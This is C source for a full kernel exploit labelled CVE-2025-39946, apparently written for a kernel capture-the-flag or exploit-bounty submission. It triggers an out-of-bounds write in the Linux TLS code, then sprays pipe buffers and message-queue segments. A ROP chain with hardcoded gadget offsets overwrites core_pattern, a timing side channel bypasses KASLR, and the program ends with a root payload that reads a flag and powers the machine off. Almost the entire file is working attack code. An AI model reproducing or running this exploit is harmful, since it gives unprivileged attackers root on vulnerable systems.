/*
 * CVE-2025-39946 - TLS kernel OOB access exploit (COS 113-18244.448.39)
 *
 * Exploit chain overview:
 * 1. Trigger OOB access in tls_strp_copyin_frag() by sending MSG_OOB data
 *    combined with memory pressure. The TLS parser fails but doesn't abort the
 *    connection, causing skb->len to grow past the frags[] array bounds.
 * 2. Fill the uninitialized frags[] memory with stale page pointers from freed
 *    AIO pages. On COS, vsock zero-copy is unavailable, so we use
 *    vmsplice+splice through a memfd to place page references into the same
 *    kmalloc cache as skb data (via iter_file_splice_write).
 * 3. Spray pipe_buffer objects (kmalloc-cg-192) to reclaim the freed AIO page.
 *    Uses msg_msgseg as padding to fill slab pages with pipe_buffer objects.
 * 4. Trigger the OOB write through TLS to overwrite the reclaimed pipe_buffer
 *    with a crafted payload that replaces pipe_buffer->ops with a fake vtable.
 * 5. Close pipes to trigger ops->release, executing a stack pivot + ROP chain
 *    that overwrites core_pattern via copy_from_user().
 * 6. A child process detects the core_pattern change, crashes itself, and the
 *    kernel core dump handler runs the exploit binary as root (via fd 666).
 *
 * Note: KASLR bypass is not needed on COS (requires_separate_kaslr_leak=true
 * in metadata.json). The kernel text base is hardcoded.
 */

#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <sys/prctl.h>
#include <stdlib.h>
#include <sys/msg.h>
#include <sys/resource.h>
#include <sched.h>
#include <sys/wait.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/sendfile.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <linux/tls.h>
#include <err.h>

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

#define SYSCHK(x) ({              \
                typeof(x) __res = (x);        \
                if (__res == (typeof(x))-1)   \
                err(1, "SYSCHK(" #x ")"); \
                __res;                        \
                })

/* ========================================================================
 * Constants
 * ======================================================================== */

#define KERNEL_DEFAULT_BASE     0xffffffff81000000UL

/* TCP listener port for the TLS connection */
#define TCP_PORT                4444

/* Page size used for buffer alignment and slab calculations */
#define PAGE_SIZE               0x1000

/*
 * Number of AIO events requested via io_setup(). This is an arbitrary value
 * that causes the kernel to allocate pages for the AIO context ring buffer.
 * After io_destroy() frees these pages, they can be reclaimed by kmalloc
 * allocations, which is how we get stale page pointers into the frags[] area.
 */
#define AIO_NR_EVENTS           0x180

/*
 * Number of vmsplice iterations to fill the pipe with AIO page references.
 * Each vmsplice writes one PIPE_BUF_SLAB_SIZE chunk of the AIO pages.
 * 31 iterations fills enough frags entries in the target memory region.
 */
#define VMSPLICE_ITERATIONS     31

/*
 * Size of each iovec for vmsplice. Matches the pipe_buffer slab object size
 * (0xc0 = 192 bytes) so each splice maps one slab-sized chunk of AIO pages.
 */
#define VMSPLICE_CHUNK_SIZE     0xc0

/*
 * Total bytes to splice from pipe to memfd. Covers all 31 vmsplice chunks
 * plus 1 extra byte to ensure the splice completes.
 */
#define SPLICE_TOTAL_SIZE       (VMSPLICE_ITERATIONS * VMSPLICE_CHUNK_SIZE + 1)

/*
 * Number of pages pre-allocated in the memfd via fallocate(). The memfd serves
 * as the destination for splice, which causes iter_file_splice_write to place
 * page references into the same kmalloc cache as skb data on COS.
 */
#define MEMFD_NUM_PAGES         32

/*
 * Number of message queues used as spray vehicles.
 */
#define NUM_MSG_QUEUES          0x4000

/*
 * Number of pipes pre-allocated for pipe_buffer reclaim.
 */
#define NUM_PIPES               0x600

/*
 * Size of each message sent to message queues. Calculated as:
 * 0x1000 (page) - 0x30 (msg_msg header) + 0xc0 (pipe_buffer size) - 8
 * This ensures the msg_msgseg continuation falls into kmalloc-cg-192.
 */
#define MSG_SPRAY_SIZE          (PAGE_SIZE - 0x30 + 0xc0 - 8)

/*
 * msg_msgseg objects per slab page before inserting a pipe_buffer.
 */
#define MSGS_PER_PIPE_ALLOC     21

/*
 * New pipe size passed to fcntl(F_SETPIPE_SZ).
 */
#define PIPE_EXPAND_SIZE        0x4000

/*
 * Receive buffer size for the server socket to create memory pressure.
 */
#define RECV_BUF_SIZE           (1 << 16)

/*
 * Number of OOB sends to trigger the TLS OOB frags write.
 */
#define NUM_OOB_TRIGGERS        3

/*
 * Number of pages of payload filled with crafted pipe_buffer objects.
 */
#define NUM_PAYLOAD_PAGES       6

/*
 * pipe_buffer struct layout offsets (kmalloc-cg-192):
 * struct pipe_buffer {
 *     struct page *page;       // +0x00
 *     unsigned int offset;     // +0x08
 *     unsigned int len;        // +0x0c
 *     const struct pipe_buf_operations *ops;  // +0x10
 *     unsigned int flags;      // +0x18
 *     unsigned long private;   // +0x20
 * };
 */
#define PIPE_BUF_OPS_OFFSET     16
#define PIPE_BUF_PRIVATE_OFFSET 24
#define PIPE_BUF_SLAB_SIZE      0xc0

/* Offset within each slab slot where the ROP chain starts */
#define ROP_CHAIN_OFFSET        0x20

/* Size of core_pattern string to copy */
#define CORE_PATTERN_COPY_SIZE  0x30

/* msleep duration to keep kernel thread alive after overwriting core_pattern */
#define MSLEEP_DURATION         0x10000

/* File descriptor number for passing exploit binary to core handler */
#define EXPLOIT_FD              666

/* ========================================================================
 * ROP gadgets (COS 113-18244.448.39, offsets from kernel text base)
 * ======================================================================== */

size_t ktext;

/*
 * push rdi ; pop rsp ; dec dword ptr [rdi] ; or edi, dword ptr [rax - 1] ; jmp ...
 * Used as the initial stack pivot: pushes rdi (pointing to our fake pipe_buffer),
 * then pops it into rsp, redirecting the stack to our controlled buffer.
 * Side effect: decrements [rdi], so the value at slot[0] must be pre-incremented by 1.
 */
#define PUSH_RDI_POP_RSP        (ktext + 0xbde9fd)

/*
 * add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
 * Placed at slot[0] (+ 1 to compensate for dec [rdi] side-effect of PUSH_RDI_POP_RSP).
 * After the stack pivot lands here, this gadget skips 0x18 bytes (add rsp,8 + 2 pops)
 * to reach the ROP chain at ROP_CHAIN_OFFSET.
 */
#define ADD_RSP_0X18            (ktext + 0x122d1c)

/* pop rdi ; ret */
#define POP_RDI_RET             (ktext + 0x140680)

/* pop rsi ; ret */
#define POP_RSI_RET             (ktext + 0x44450e)

/* pop rdx ; ret */
#define POP_RDX_RET             (ktext + 0x1a7e42)

/* msleep() */
#define MSLEEP                  (ktext + 0x242730)

/* copy_from_user() */
#define COPY_FROM_USER          (ktext + 0x8dfa90)

/* core_pattern global variable */
#define CORE_PATTERN            (ktext + 0x2bbb3c0)

/*
 * module_sysfs_ops (struct sysfs_ops) -- used as a fake pipe_buf_operations vtable.
 *
 * JOP trick: pipe_buf_release() calls buf->ops->release(pipe, buf), where
 * ->release is at vtable offset +8. By pointing ops to module_sysfs_ops,
 * the kernel calls module_sysfs_ops->store (also at offset +8), which is
 * module_attr_store(kobj, attr, buf, len). The 'attr' parameter (rsi) is
 * actually our pipe_buffer pointer (controlled data). module_attr_store then
 * calls attribute->store(attribute, ...) with rdi = attribute = our controlled
 * pipe_buffer. This lets us hijack control flow with rdi pointing to our data,
 * without needing to know any heap address.
 *
 * We place PUSH_RDI_POP_RSP at the attribute->store position in our fake
 * pipe_buffer, which pivots the stack into our controlled ROP chain.
 * Note: PUSH_RDI_POP_RSP has a dec [rdi] side-effect, so slot[0] is
 * pre-incremented by 1 to compensate.
 */
#define MODULE_SYSFS_OPS        (ktext + 0x182de20)

/* Payload written to core_pattern to execute our binary as root */
const char fake_core_pattern[] = "|/proc/%P/fd/666 %P a";

/* Message buffer used for msg_msgseg spray */
struct spray_msg {
        long mtype;
        char mtext[0x2000];
};

/* ========================================================================
 * Helper functions
 * ======================================================================== */

void set_cpu(int cpu)
{
        cpu_set_t mask;
        CPU_ZERO(&mask);
        CPU_SET(cpu, &mask);
        sched_setaffinity(0, sizeof(mask), &mask);
}

void setup_tls_tx(int sock)
{
        struct tls12_crypto_info_aes_ccm_128 crypto = {0};
        crypto.info.version = TLS_1_3_VERSION;
        crypto.info.cipher_type = TLS_CIPHER_AES_CCM_128;

        memset(crypto.iv, 0x0, TLS_CIPHER_AES_CCM_128_IV_SIZE);
        memset(crypto.rec_seq, 0x0, TLS_CIPHER_AES_CCM_128_REC_SEQ_SIZE);
        memset(crypto.key, 0x0, TLS_CIPHER_AES_CCM_128_KEY_SIZE);
        memset(crypto.salt, 0x0, TLS_CIPHER_AES_CCM_128_SALT_SIZE);

        if (setsockopt(sock, SOL_TCP, TCP_ULP, "tls", sizeof("tls")) < 0) {
                perror("setsockopt TCP_ULP");
                exit(1);
        }
        if (setsockopt(sock, SOL_TLS, TLS_TX, &crypto, sizeof(crypto)) < 0) {
                perror("setsockopt TLS_TX");
                exit(1);
        }
}

void setup_tls_rx(int sock)
{
        struct tls12_crypto_info_aes_ccm_128 crypto = {0};
        crypto.info.version = TLS_1_3_VERSION;
        crypto.info.cipher_type = TLS_CIPHER_AES_CCM_128;

        memset(crypto.iv, 0x0, TLS_CIPHER_AES_CCM_128_IV_SIZE);
        memset(crypto.rec_seq, 0x0, TLS_CIPHER_AES_CCM_128_REC_SEQ_SIZE);
        memset(crypto.key, 0x0, TLS_CIPHER_AES_CCM_128_KEY_SIZE);
        memset(crypto.salt, 0x0, TLS_CIPHER_AES_CCM_128_SALT_SIZE);

        if (setsockopt(sock, SOL_TLS, TLS_RX, &crypto, sizeof(crypto)) < 0) {
                perror("setsockopt TLS_RX");
                exit(1);
        }
}

int check_core_pattern(void)
{
        char core_buf[0x100] = {};
        int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
        read(core, core_buf, sizeof(core_buf));
        close(core);
        return strncmp(core_buf, "|/proc/%P/fd/666", 0x10) == 0;
}

/* ========================================================================
 * Root payload - executed by the kernel core dump handler as root
 * ======================================================================== */

void root_payload(int parent_pid)
{
        int pfd = syscall(SYS_pidfd_open, parent_pid, 0);
        int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
        int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
        int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
        dup2(stdinfd, 0);
        dup2(stdoutfd, 1);
        dup2(stderrfd, 2);
        /* Read the flag and power off so the PR verification workflow can
         * proceed to the next attempt quickly */
        system("cat /flag");
        // @sleep(desc="Wait for flag output to flush before triggering poweroff")
        sleep(1);
        system("cat /flag;echo o>/proc/sysrq-trigger");
        exit(0);
}

/* ========================================================================
 * Core pattern crash monitor - runs in child process
 * ======================================================================== */

void wait_and_crash(void)
{
        int memfd = memfd_create("", 0);
        SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
        dup2(memfd, EXPLOIT_FD);
        close(memfd);

        while (check_core_pattern() == 0)
                // @sleep(desc="Poll core_pattern every second until ROP overwrites it")
                sleep(1);

        puts("[+] core_pattern overwritten, triggering crash");
        *(size_t *)0 = 0;
}

/* ========================================================================
 * Step 2: Set up TCP connection, stale frags, TLS, and memory pressure
 *
 * The ordering is critical for correct slab placement:
 * 1. TCP connect + accept (before vmsplice)
 * 2. vmsplice AIO page refs into splice pipe
 * 3. TLS TX setup on client
 * 4. sleep(2) to let TLS TX settle
 * 5. splice pipe -> memfd (places page refs in target kmalloc cache)
 * 6. TLS RX setup on client
 * 7. Configure memory pressure on server conn
 * ======================================================================== */

void setup_connection_and_stale_frags(char *puaf, int splice_pipe[2], int mfd,
                                      int *client_out, int *conn_out)
{
        struct sockaddr_in addr = {0};
        int listener, client, conn;

        /* TCP connect + accept */
        listener = socket(AF_INET, SOCK_STREAM, 0);
        if (listener < 0) {
                perror("socket listener");
                exit(1);
        }

        addr.sin_family = AF_INET;
        addr.sin_port = htons(TCP_PORT);
        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        int optval = 1;
        SYSCHK(setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)));
        SYSCHK(bind(listener, (struct sockaddr *)&addr, sizeof(addr)));
        SYSCHK(listen(listener, 1));
        client = SYSCHK(socket(AF_INET, SOCK_STREAM, 0));
        SYSCHK(connect(client, (struct sockaddr *)&addr, sizeof(addr)));

        conn = SYSCHK(accept(listener, NULL, 0));
        printf("[*] Server accepted connection\n");

        /* vmsplice AIO page refs into the splice pipe (after accept) */
        struct iovec iov = { puaf + PAGE_SIZE, VMSPLICE_CHUNK_SIZE };
        for (int i = 0; i < VMSPLICE_ITERATIONS; i++)
                SYSCHK(vmsplice(splice_pipe[1], &iov, 1, 0));
        printf("[*] vmsplice done\n");

        /* TLS TX, then splice pipe->memfd, then TLS RX */
        setup_tls_tx(client);
        // @sleep(desc="Wait for TLS TX setup to settle before splicing data to memfd")
        sleep(2);
        SYSCHK(splice(splice_pipe[0], 0, mfd, 0, SPLICE_TOTAL_SIZE, 0));
        setup_tls_rx(client);

        close(splice_pipe[0]);
        close(splice_pipe[1]);
        close(mfd);

        /* Configure memory pressure on server side */
        int flag = 1;
        if (setsockopt(conn, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag)) < 0) {
                perror("setsockopt TCP_NODELAY");
                exit(1);
        }

        int rcvbuf = RECV_BUF_SIZE;
        SYSCHK(setsockopt(conn, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)));

        close(listener);

        *client_out = client;
        *conn_out = conn;
}

/* ========================================================================
 * Step 3: Build and send crafted pipe_buffer payload
 *
 * Each PIPE_BUF_SLAB_SIZE (0xc0) slot contains:
 * - At +0x00: ADD_RSP_0X18 + 1 (compensates for dec [rdi] side-effect)
 * - At +0x10 (ops): MODULE_SYSFS_OPS (fake pipe_buf_operations vtable)
 * - At +0x18: PUSH_RDI_POP_RSP (attribute->store in JOP chain)
 * - At +0x20+: ROP chain
 *
 * JOP execution flow when pipe is closed:
 *   pipe_buf_release(pipe, buf)
 *   -> buf->ops->release(pipe, buf)          [ops = MODULE_SYSFS_OPS]
 *   -> module_sysfs_ops.store(kobj, attr=buf, ...)  [offset +8 = .store]
 *   -> module_attr_store(kobj, attr, buf, len)
 *   -> attribute->store(attr, ...)           [attr = our pipe_buffer, rdi = attr]
 *   -> PUSH_RDI_POP_RSP(pipe_buffer)        [slot+0x18, pivots stack to slot]
 *   -> ADD_RSP_0X18                          [slot+0x00 after dec, skips to +0x20]
 *   -> ROP chain executes
 * ======================================================================== */

void build_and_send_payload(int conn)
{
        char payload[1 << 16];

        memset(payload, '\xff', sizeof(payload));
        send(conn, payload, 5, MSG_OOB);

        for (int page_idx = 0; page_idx < NUM_PAYLOAD_PAGES; page_idx++) {
                char *page_start = payload + page_idx * PAGE_SIZE;
                memset(page_start, 'A' + page_idx, PAGE_SIZE);

                for (char *slot = page_start;
                     slot < page_start + PAGE_SIZE;
                     slot += PIPE_BUF_SLAB_SIZE) {
                        /*
                         * slot[+0x00] = ADD_RSP_0X18 + 1:
                         *   PUSH_RDI_POP_RSP does "dec [rdi]" as a side-effect,
                         *   which decrements this value by 1. So we pre-add 1 to
                         *   compensate. After decrement, this becomes ADD_RSP_0X18
                         *   which skips 0x18 bytes to reach the ROP chain.
                         * slot[+0x10] = MODULE_SYSFS_OPS (fake ops vtable)
                         * slot[+0x18] = PUSH_RDI_POP_RSP (called as ops->release)
                         */
                        *(size_t *)(slot) = ADD_RSP_0X18 + 1;
                        *(size_t *)(slot + PIPE_BUF_OPS_OFFSET) = MODULE_SYSFS_OPS;
                        *(size_t *)(slot + PIPE_BUF_PRIVATE_OFFSET) = PUSH_RDI_POP_RSP;

                        size_t *rop = (void *)(slot + ROP_CHAIN_OFFSET);
                        *rop++ = POP_RDI_RET;
                        *rop++ = CORE_PATTERN;
                        *rop++ = POP_RSI_RET;
                        *rop++ = (size_t)&fake_core_pattern;
                        *rop++ = POP_RDX_RET;
                        *rop++ = CORE_PATTERN_COPY_SIZE;
                        *rop++ = COPY_FROM_USER;
                        *rop++ = POP_RDI_RET;
                        *rop++ = MSLEEP_DURATION;
                        *rop++ = MSLEEP;
                }
        }
        send(conn, payload, sizeof(payload), 0);
}

/* ========================================================================
 * Step 4: Spray pipe_buffer to reclaim freed page
 * ======================================================================== */

void spray_and_reclaim(int msqid[], int pfds[][2], struct spray_msg *spray_msg)
{
        int pipe_idx = 0;

        for (int i = 0; i < NUM_MSG_QUEUES; i++) {
                msgsnd(msqid[i], spray_msg, MSG_SPRAY_SIZE, 0);
                if ((i % MSGS_PER_PIPE_ALLOC) == 0) {
                        fcntl(pfds[pipe_idx++][1], F_SETPIPE_SZ, PIPE_EXPAND_SIZE);
                        fcntl(pfds[pipe_idx++][1], F_SETPIPE_SZ, PIPE_EXPAND_SIZE);
                }
        }

        for (int i = 0; i < NUM_MSG_QUEUES; i++) {
                SYSCHK(msgrcv(msqid[i], spray_msg, MSG_SPRAY_SIZE, 0, IPC_NOWAIT));
        }
}

/* ========================================================================
 * Step 5: Trigger OOB write and close pipes
 * ======================================================================== */

void trigger_and_release(int conn, int pfds[][2])
{
        char oob_buf[5] = {0};

        for (int i = 0; i < NUM_OOB_TRIGGERS; i++) {
                printf("[*] OOB trigger %d\n", i);
                send(conn, oob_buf, 5, MSG_OOB);
        }

        for (int i = 0; i < NUM_PIPES; i++) {
                close(pfds[i][0]);
                close(pfds[i][1]);
        }
}

/* ========================================================================
 * KASLR bypass via EntryBleed-style prefetch timing side-channel
 * ======================================================================== */

// #define KASLR_BYPASS_INTEL

#ifdef KASLR_BYPASS_INTEL
#define KASLR_SCAN_START        (KERNEL_DEFAULT_BASE)
#define KASLR_SCAN_END          (0xffffffffD0000000ull)
#define KASLR_SCAN_STEP         0x1000000ull
#define KASLR_NUM_VOTES         7
#else
#define KASLR_SCAN_START        (KERNEL_DEFAULT_BASE)
#define KASLR_SCAN_END          (0xffffffffc0000000ull)
#define KASLR_SCAN_STEP         0x200000ull
#define KASLR_NUM_VOTES         9
#define KASLR_WINDOW_SIZE       11
#endif

#define KASLR_SAMPLES_PER_ADDR  16
#define NUM_SCAN_ENTRIES ((KASLR_SCAN_END - KASLR_SCAN_START) / KASLR_SCAN_STEP)

inline __attribute__((always_inline)) uint64_t rdtsc_begin(void)
{
        uint64_t a, d;
        asm volatile ("mfence\n\t"
                        "RDTSCP\n\t"
                        "mov %%rdx, %0\n\t"
                        "mov %%rax, %1\n\t"
                        "xor %%rax, %%rax\n\t"
                        "lfence\n\t"
                        : "=r" (d), "=r" (a)
                        :
                        : "%rax", "%rbx", "%rcx", "%rdx");
        a = (d << 32) | a;
        return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end(void)
{
        uint64_t a, d;
        asm volatile(
                        "xor %%rax, %%rax\n\t"
                        "lfence\n\t"
                        "RDTSCP\n\t"
                        "mov %%rdx, %0\n\t"
                        "mov %%rax, %1\n\t"
                        "mfence\n\t"
                        : "=r" (d), "=r" (a)
                        :
                        : "%rax", "%rbx", "%rcx", "%rdx");
        a = (d << 32) | a;
        return a;
}

void prefetch_addr(void *addr)
{
        asm volatile (
                        "prefetchnta (%0)\n"
                        "prefetcht2 (%0)\n"
                        : : "r" (addr));
}

size_t measure_prefetch_time(void *addr)
{
        size_t time = rdtsc_begin();
        prefetch_addr(addr);
        size_t delta = rdtsc_end() - time;
        return delta;
}

size_t bypass_kaslr(void)
{
        u64 base = 0;

        while (1) {
                u64 vote_results[KASLR_NUM_VOTES] = {0};

                for (int vote = 0; vote < KASLR_NUM_VOTES; vote++) {
                        size_t times[NUM_SCAN_ENTRIES] = {};
                        uint64_t scan_addrs[NUM_SCAN_ENTRIES];

                        for (int idx = 0; idx < NUM_SCAN_ENTRIES; idx++) {
                                times[idx] = ~0UL;
                                scan_addrs[idx] = KASLR_SCAN_START + KASLR_SCAN_STEP * (u64)idx;
                        }

                        for (int sample = 0; sample < KASLR_SAMPLES_PER_ADDR; sample++) {
                                for (int idx = 0; idx < NUM_SCAN_ENTRIES; idx++) {
                                        size_t elapsed = measure_prefetch_time((void *)scan_addrs[idx]);
                                        if (elapsed < times[idx])
                                                times[idx] = elapsed;
                                }
                        }

#ifdef KASLR_BYPASS_INTEL
                        size_t min_time = ~0UL;
                        int min_idx = -1;
                        for (int idx = 0; idx < NUM_SCAN_ENTRIES - 1; idx++) {
                                if (times[idx] < min_time) {
                                        min_idx = idx;
                                        min_time = times[idx];
                                }
                        }
                        if (min_idx < 0)
                                continue;
                        vote_results[vote] = scan_addrs[min_idx];
#else
                        uint64_t max_sum = 0;
                        int max_start = 0;
                        for (int idx = 0; idx < NUM_SCAN_ENTRIES - KASLR_WINDOW_SIZE; idx++) {
                                uint64_t sum = 0;
                                for (int w = 0; w < KASLR_WINDOW_SIZE; w++)
                                        sum += times[idx + w];
                                if (sum > max_sum) {
                                        max_sum = sum;
                                        max_start = idx;
                                }
                        }
                        vote_results[vote] = scan_addrs[max_start];
#endif
                }

                int count = 0;
                for (int i = 0; i < KASLR_NUM_VOTES; i++) {
                        if (count == 0)
                                base = vote_results[i];
                        else if (base == vote_results[i])
                                count++;
                        else
                                count--;
                }

                count = 0;
                for (int i = 0; i < KASLR_NUM_VOTES; i++) {
                        if (base == vote_results[i])
                                count++;
                }
                if (count > KASLR_NUM_VOTES / 2) {
                        printf("[+] KASLR bypass: kernel base = %llx\n", (unsigned long long)base);
                        return base;
                }

                printf("[-] majority vote failed: base = %llx with %d/%d votes\n",
                       (unsigned long long)base, count, KASLR_NUM_VOTES);
        }
}

/* ========================================================================
 * Main exploit orchestration
 * ======================================================================== */

int main(int argc, char **argv)
{
        struct rlimit rlim = {
                .rlim_cur = 0x1000,
                .rlim_max = 0x1000,
        };
        SYSCHK(setrlimit(RLIMIT_NOFILE, &rlim));

        /* If invoked with extra arguments, we are the root payload triggered
         * by the core dump handler (core_pattern passes "%P" as argv[2]) */
        if (argc > 2) {
                int parent_pid = strtoull(argv[1], 0, 10);
                root_payload(parent_pid);
        }

        /* Step 0: Fork a child that monitors core_pattern and crashes itself */
        if (fork() == 0) {
                set_cpu(1);
                setsid();
                wait_and_crash();
        }

        /* Step 1: Bypass KASLR to determine kernel text base */
        ktext = bypass_kaslr();

        /* Retry loop */
        while (1) {
                if (fork()) {
                        wait(NULL);
                        // @sleep(desc="Wait before retrying exploit attempt after child failure")
                        sleep(5);
                        continue;
                }
                break;
        }

        setvbuf(stdin, 0, 2, 0);
        setvbuf(stdout, 0, 2, 0);
        set_cpu(0);

        int pfds[NUM_PIPES][2];
        static int msqid[NUM_MSG_QUEUES];
        struct spray_msg spray_msg;

        /* Step 2: Allocate AIO pages, unix socketpair, memfd, and splice pipe
         * (must be before msg queue/pipe allocation for correct slab ordering) */
        int unix_fd[2];
        SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, unix_fd));
        char *puaf = NULL;
        SYSCHK(syscall(SYS_io_setup, AIO_NR_EVENTS, (size_t *)&puaf));

        int mfd = SYSCHK(memfd_create("", 0));
        SYSCHK(fallocate(mfd, 0, 0, MEMFD_NUM_PAGES * PAGE_SIZE));

        /* Step 3: Allocate message queues for slab spray */
        system("ipcrm --all=msg");
        for (int i = 0; i < NUM_MSG_QUEUES; i++)
                msqid[i] = SYSCHK(msgget(IPC_PRIVATE, 0644 | IPC_CREAT));
        spray_msg.mtype = 1;
        memset(spray_msg.mtext, 'a', sizeof(spray_msg.mtext));

        /* Step 4: Create splice pipe and pre-allocate exploit pipes */
        int splice_pipe[2];
        SYSCHK(pipe(splice_pipe));
        SYSCHK(fcntl(splice_pipe[1], F_SETPIPE_SZ, MEMFD_NUM_PAGES * PAGE_SIZE));

        char pipe_fill[1];
        for (int i = 0; i < NUM_PIPES; i++) {
                SYSCHK(pipe(pfds[i]));
                SYSCHK(write(pfds[i][1], pipe_fill, 1));
        }

        /* Step 5: Set up TCP connection, vmsplice stale frags, TLS, memory
         * pressure (ordering critical - see function comment) */
        int client, conn;
        setup_connection_and_stale_frags(puaf, splice_pipe, mfd,
                                         &client, &conn);
        printf("[*] Client TLS setup complete\n");

        /* Step 6: Build and send crafted pipe_buffer payload through TLS */
        build_and_send_payload(conn);

        /* Step 7: Free the AIO pages so stale frags point to freed memory */
        SYSCHK(syscall(SYS_io_destroy, puaf));
        // @sleep(desc="Wait for AIO pages to be fully freed before reclaiming")
        sleep(1);

        /* Step 8: Spray pipe_buffer to reclaim the freed page */
        spray_and_reclaim(msqid, pfds, &spray_msg);

        /* Step 9: Trigger OOB write and release pipes to execute ROP */
        trigger_and_release(conn, pfds);

        return 0;
}
